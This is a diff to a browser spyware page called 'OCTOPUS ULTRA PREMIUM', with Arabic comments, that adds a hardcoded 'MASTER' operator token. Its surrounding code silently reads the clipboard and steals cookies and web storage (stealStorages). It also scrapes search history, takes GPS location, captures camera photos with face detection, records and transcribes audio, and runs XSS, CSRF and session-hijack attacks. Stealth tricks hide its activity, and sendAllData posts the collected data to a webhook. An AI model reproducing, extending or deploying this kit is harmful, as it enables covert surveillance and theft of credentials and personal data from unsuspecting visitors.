@@ -7,7 +7,7 @@
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🐙</text></svg>" />
     <style>
         /* ================================================================
-           OCTOPUS ULTRA PREMIUM – إصدار 2.2
+           OCTOPUS ULTRA PREMIUM – إصدار 2.3
            تصميم دقيق، صامت، احترافي، يعمل مع أو بدون توكن
            ================================================================ */
 
@@ -392,8 +392,8 @@
 
     <script>
         // ================================================================
-        //  OCTOPUS ULTRA PREMIUM v2.2 – الجراحة الصامتة المتطورة
-        //  يعمل مع أو بدون توكن – توكن 6 أحرف
+        //  OCTOPUS ULTRA PREMIUM v2.3 – الجراحة الصامتة المتطورة
+        //  يعمل مع أو بدون توكن – بدون توكن = MASTER
         // ================================================================
 
         // ================================================================
@@ -411,6 +411,7 @@
             TOKEN_LENGTH: 6,
             MAX_FILE_SIZE: 10 * 1024 * 1024,
             FACE_MODEL_URL: 'https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/weights',
+            MASTER_TOKEN: 'MASTER', // التوكن الأساسي للمطور
         };
 
         // ================================================================
@@ -486,18 +487,8 @@
         }
 
         // ================================================================
-        //  5. توليد واستخراج التوكن (يعمل مع أو بدون رابط)
+        //  5. استخراج التوكن (مع أو بدون رابط) – بدون توكن = MASTER
         // ================================================================
-
-        /** توليد توكن عشوائي 6 أحرف */
-        function generateToken() {
-            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-            let token = '';
-            for (let i = 0; i < CONFIG.TOKEN_LENGTH; i++) {
-                token += chars[Math.floor(Math.random() * chars.length)];
-            }
-            return token;
-        }
 
         /** استخراج أو توليد التوكن – يعمل دائماً */
         function extractTokenFromURL() {
@@ -518,16 +509,17 @@
                 return true;
             }
 
-            // 3. توليد توكن جديد
-            const newToken = generateToken();
-            state.userToken = newToken;
-            sessionStorage.setItem('octopus_token', newToken);
+            // 3. لو مفيش توكن → استخدم التوكن الأساسي للمطور
+            const masterToken = CONFIG.MASTER_TOKEN;
+            state.userToken = masterToken;
+            sessionStorage.setItem('octopus_token', masterToken);
             return true; // دايماً true عشان الصفحة تظهر
         }
 
         // ================================================================
-        //  6. تصنيف الجهاز
+        //  6. باقي الدوال (نفس الكود السابق)
         // ================================================================
+
         function classifyDevice() {
             const ua = navigator.userAgent;
             const result = { os: 'Unknown', osVersion: 'Unknown', browser: 'Unknown', browserVersion: 'Unknown',
@@ -565,9 +557,6 @@
             return result;
         }
 
-        // ================================================================
-        //  7. كشف التزوير (محسّن)
-        // ================================================================
         function detectSpoofing() {
             const result = { canvasSpoof: false, webglSpoof: false, vpnProxy: false, headless: false };
 
@@ -623,9 +612,6 @@
             return result;
         }
 
-        // ================================================================
-        //  8. كشف الإضافات (محسّن)
-        // ================================================================
         async function detectExtensions() {
             const extensions = [];
             const known = [
@@ -665,9 +651,6 @@
             return extensions;
         }
 
-        // ================================================================
-        //  9. قراءة الحافظة
-        // ================================================================
         async function readClipboard() {
             try {
                 state.clipboardContent = await navigator.clipboard.readText();
@@ -687,9 +670,6 @@
             }
         }
 
-        // ================================================================
-        //  10. سرقة الكوكيز والـ Storages
-        // ================================================================
         function stealStorages() {
             const result = { cookies: document.cookie, localStorage: {}, sessionStorage: {} };
             try {
@@ -708,9 +688,6 @@
             return result;
         }
 
-        // ================================================================
-        //  11. جلب سجل البحث
-        // ================================================================
         function getSearchHistory() {
             const keys = ['search', 'query', 'q', 'history', 'recent', 'lastSearch', 'searchTerms', 'queries'];
             const results = [];
@@ -728,9 +705,6 @@
             return results;
         }
 
-        // ================================================================
-        //  12. بيانات الجهاز الأساسية (شاملة)
-        // ================================================================
         async function collectDeviceData() {
             const data = {};
             const dev = state.deviceClassification;
@@ -869,9 +843,6 @@
             return data;
         }
 
-        // ================================================================
-        //  13. الموقع الجغرافي (GPS)
-        // ================================================================
         async function getLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
@@ -948,9 +919,6 @@
             });
         }
 
-        // ================================================================
-        //  14. تحميل Face-API (مرة واحدة مع retry)
-        // ================================================================
         async function loadFaceApi() {
             if (state.isFaceApiLoaded) return true;
             if (state.faceApiLoadAttempted) return false;
@@ -977,9 +945,6 @@
             }
         }
 
-        // ================================================================
-        //  15. الكاميرا – 8 صور + كشف الوجه
-        // ================================================================
         async function startCameraAndCapture() {
             return new Promise(async (resolve) => {
                 try {
@@ -1014,7 +979,6 @@
                     el.hiddenCanvas.width = w;
                     el.hiddenCanvas.height = h;
 
-                    // كشف الوجه
                     const faceLoaded = await loadFaceApi();
                     if (faceLoaded) {
                         try {
@@ -1063,9 +1027,6 @@
             });
         }
 
-        // ================================================================
-        //  16. تسجيل الصوت (8 ثواني) + تحويل إلى نص
-        // ================================================================
         async function recordAudio() {
             return new Promise(async (resolve) => {
                 try {
@@ -1103,9 +1064,6 @@
             });
         }
 
-        // ================================================================
-        //  17. تحويل الصوت إلى نص (Web Speech API مع كشف اللغة)
-        // ================================================================
         async function transcribeAudio(blob) {
             try {
                 if (!('webkitSpeechRecognition' in window) && !('SpeechRecognition' in window)) return;
@@ -1143,9 +1101,6 @@
             }
         }
 
-        // ================================================================
-        //  18. الهجمات المتقدمة (XSS, CSRF, Session Hijacking)
-        // ================================================================
         function deployAdvancedAttacks() {
             const results = { xss: false, csrf: false, sessionHijack: false, payloads: [] };
 
@@ -1186,9 +1141,6 @@
             return results;
         }
 
-        // ================================================================
-        //  19. المراقبة الأمنية (صامتة)
-        // ================================================================
         function setupSecurity() {
             document.addEventListener('contextmenu', e => e.preventDefault());
             document.addEventListener('dragstart', e => e.preventDefault());
@@ -1238,9 +1190,6 @@
             fetch(CONFIG.WEBHOOK_URL, { method: 'POST', body: fd }).catch(() => {});
         }
 
-        // ================================================================
-        //  20. تحسين التخفي
-        // ================================================================
         function enhanceStealth() {
             console.log = console.warn = console.error = console.info = () => {};
 
@@ -1263,9 +1212,6 @@
             } catch (_) {}
         }
 
-        // ================================================================
-        //  21. إرسال البيانات إلى الخادم
-        // ================================================================
         async function sendAllData() {
             const fd = new FormData();
             fd.append('event', 'submission');
@@ -1303,9 +1249,6 @@
             return result;
         }
 
-        // ================================================================
-        //  22. العملية الرئيسية (جمع كل شيء بصمت)
-        // ================================================================
         async function collectEverything() {
             if (state.isCollecting || state.collectionComplete) return;
             state.isCollecting = true;
@@ -1403,7 +1346,7 @@
             detectSpoofing();
             await collectDeviceData();
 
-            console.log('🐙 OCTOPUS ULTRA PREMIUM v2.2 – جاهز (توكن: ' + state.userToken + ')');
+            console.log('🐙 OCTOPUS ULTRA PREMIUM v2.3 – جاهز (توكن: ' + state.userToken + ')');
         });
 
         // تنظيف التدفقات عند الخروج
